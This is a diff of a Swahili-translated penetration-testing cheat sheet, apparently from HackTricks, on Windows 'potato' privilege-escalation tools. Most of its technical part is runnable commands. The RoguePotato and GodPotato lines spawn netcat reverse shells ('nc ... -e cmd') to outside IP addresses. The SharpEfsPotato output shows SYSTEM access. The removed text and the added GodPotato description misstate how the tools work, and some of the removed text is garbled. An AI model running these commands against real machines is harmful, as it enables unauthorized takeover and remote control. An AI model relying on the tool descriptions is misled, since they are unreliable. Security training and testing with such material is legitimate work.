@@ -2,23 +2,37 @@
 
 <details>
 
-<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>
 
 Njia nyingine za kusaidia HackTricks:
 
-* Ikiwa unataka kuona **kampuni yako ikionekana kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
-* Pata [**swag rasmi wa PEASS & HackTricks**](https://peass.creator-spring.com)
-* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
+* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA USAJILI**](https://github.com/sponsors/carlospolop)!
+* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
+* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
 * **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwenye** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.
+* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.
 
 </details>
 
+## WhiteIntel
+
+<figure><img src=".gitbook/assets/image (1224).png" alt=""><figcaption></figcaption></figure>
+
+[**WhiteIntel**](https://whiteintel.io) ni injini ya utaftaji inayotumia **dark-web** ambayo inatoa huduma za **bure** za kuangalia ikiwa kampuni au wateja wake wameathiriwa na **malware za wizi**.
+
+Lengo kuu la WhiteIntel ni kupambana na utekaji wa akaunti na mashambulio ya ransomware yanayotokana na malware za kuiba taarifa.
+
+Unaweza kutembelea tovuti yao na kujaribu injini yao **bure** kwa:
+
+{% embed url="https://whiteintel.io" %}
+
+---
+
 {% hint style="warning" %}
-**JuicyPotato haifanyi kazi** kwenye Windows Server 2019 na Windows 10 toleo la 1809 na baadaye. Walakini, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato) inaweza kutumika kuchukua nafasi sawa na kupata ufikiaji wa kiwango cha `NT AUTHORITY\SYSTEM`. Chapisho hili la blogu linatoa maelezo ya kina juu ya zana ya `PrintSpoofer`, ambayo inaweza kutumika kudhulumu mamlaka za udanganyifu kwenye mwenyeji wa Windows 10 na Server 2019 ambapo JuicyPotato haifanyi kazi tena.
+**JuicyPotato haitumiki** kwenye Windows Server 2019 na Windows 10 toleo la 1809 na baadaye. Hata hivyo, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato) inaweza kutumika kwa **kutumia haki sawa na kupata ufikiaji wa kiwango cha `NT AUTHORITY\SYSTEM`**. Chapisho hili la blogu linachunguza kwa undani zana ya `PrintSpoofer`, ambayo inaweza kutumika kudhuru haki za uigaji kwenye mwenyeji wa Windows 10 na Server 2019 ambapo JuicyPotato haifanyi kazi tena.
 {% endhint %}
 
-## Onyesho Rahisi
+## Onyesho Haraka
 
 ### PrintSpoofer
 ```bash
@@ -43,32 +57,9 @@ c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -l
 # In some old versions you need to use the "-f" param
 c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999
 ```
-{% code %}
+{% endcode %}
 
 ### SharpEfsPotato
-
-SharpEfsPotato ni zana ya uchomaji ya Windows ambayo inaweza kutumiwa kutekeleza shambulio la kusudi la kusudi (LPE) kwenye mfumo wa Windows. Zana hii inatumia udhaifu katika mchakato wa kusindika faili ya EFS (Encrypting File System) ili kujipatia mamlaka ya juu ya mfumo.
-
-#### Jinsi Inavyofanya Kazi
-
-SharpEfsPotato inafanya kazi kwa kuchanganya udhaifu katika mchakato wa kusindika faili ya EFS na udhaifu katika mchakato wa kusindika faili ya COM (Component Object Model). Kwa kufanya hivyo, inaweza kutekeleza shambulio la kusudi la kusudi na kujipatia mamlaka ya juu ya mfumo.
-
-#### Jinsi ya Kutumia SharpEfsPotato
-
-1. Pakua na usakinishe zana ya SharpEfsPotato kwenye mfumo wako wa Windows.
-2. Fungua terminal na endesha zana kwa kutumia amri ifuatayo:
-
-   ```
-   SharpEfsPotato.exe
-   ```
-
-3. Zana itajaribu kutekeleza shambulio la kusudi la kusudi na kujipatia mamlaka ya juu ya mfumo. Ikiwa shambulio linafanikiwa, utapata mamlaka ya juu ya mfumo.
-
-#### Tahadhari
-
-Ni muhimu kutambua kuwa kutumia SharpEfsPotato ni kinyume cha sheria na inaweza kusababisha madhara makubwa. Ni muhimu kuzingatia sheria na kufanya shughuli za uchomaji tu kwa idhini sahihi na kwa madhumuni halali.
-
-{% endcode %}
 ```
 SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
 SharpEfsPotato by @bugch3ck
@@ -89,25 +80,7 @@ nt authority\system
 ```
 ### GodPotato
 
-GodPotato ni mbinu ya kufanya uchomaji wa kawaida wa kijijini kwa kutumia udhaifu katika huduma ya Print Spooler ya Windows. Mbinu hii inaruhusu mtumiaji mwenye ruhusa ya chini kutekeleza amri kwa kiwango cha juu cha ruhusa.
-
-#### Jinsi ya Kutumia GodPotato
-
-1. Pakua GodPotato kutoka kwenye uhifadhi wa GitHub.
-2. Weka faili ya GodPotato kwenye mfumo wa lengo.
-3. Fungua terminal na endesha amri ifuatayo: `.\GodPotato.exe -c "amri_ya_kutekeleza"`.
-4. Amri itatekelezwa kwa kiwango cha juu cha ruhusa.
-
-#### Kuzuia GodPotato
-
-Ili kuzuia shambulio la GodPotato, unaweza kufuata hatua zifuatazo:
-
-1. Lemaza huduma ya Print Spooler ikiwa haifai kwa mfumo wako.
-2. Hakikisha mfumo wako una sasisho za usalama za hivi karibuni.
-3. Fuatilia na angalia mara kwa mara mabadiliko yoyote katika mfumo wako.
-4. Tumia ufumbuzi wa usalama uliopendekezwa na wauzaji wa mfumo wako.
-
-Kwa kufuata hatua hizi, unaweza kuzuia shambulio la GodPotato na kuhakikisha usalama wa mfumo wako.
+GodPotato ni mchanganyiko wa RoguePotato na PrintSpoofer. Inatumia PrintSpoofer kuchapisha kwa printer ya uongo na kisha kutumia RoguePotato kutekeleza amri ya mfumo kwa kutumia uchapishaji wa printer ya uongo. Hii inaweza kusababisha kupanda kwa mamlaka kwenye mfumo.
 ```
 GodPotato -cmd "cmd /c whoami"
 GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
@@ -119,16 +92,28 @@ GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
 * [https://github.com/bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
 * [https://github.com/BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
 
+## WhiteIntel
+
+<figure><img src=".gitbook/assets/image (1224).png" alt=""><figcaption></figcaption></figure>
+
+[**WhiteIntel**](https://whiteintel.io) ni injini ya utaftaji inayotumia **dark-web** ambayo inatoa huduma za **bure** za kuangalia ikiwa kampuni au wateja wake wameathiriwa na **malware za kuiba**.
+
+Lengo kuu la WhiteIntel ni kupambana na utekaji wa akaunti na mashambulio ya ransomware yanayotokana na malware za kuiba taarifa.
+
+Unaweza kutembelea tovuti yao na kujaribu injini yao **bure** kwa:
+
+{% embed url="https://whiteintel.io" %}
+
 <details>
 
-<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Jifunze AWS hacking kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
 Njia nyingine za kusaidia HackTricks:
 
-* Ikiwa unataka kuona **kampuni yako inatangazwa kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
-* Pata [**swag rasmi wa PEASS & HackTricks**](https://peass.creator-spring.com)
-* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
-* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Shiriki mbinu zako za kudukua kwa kuwasilisha PR kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
+* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
+* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
+* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Shiriki mbinu zako za kuhack kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
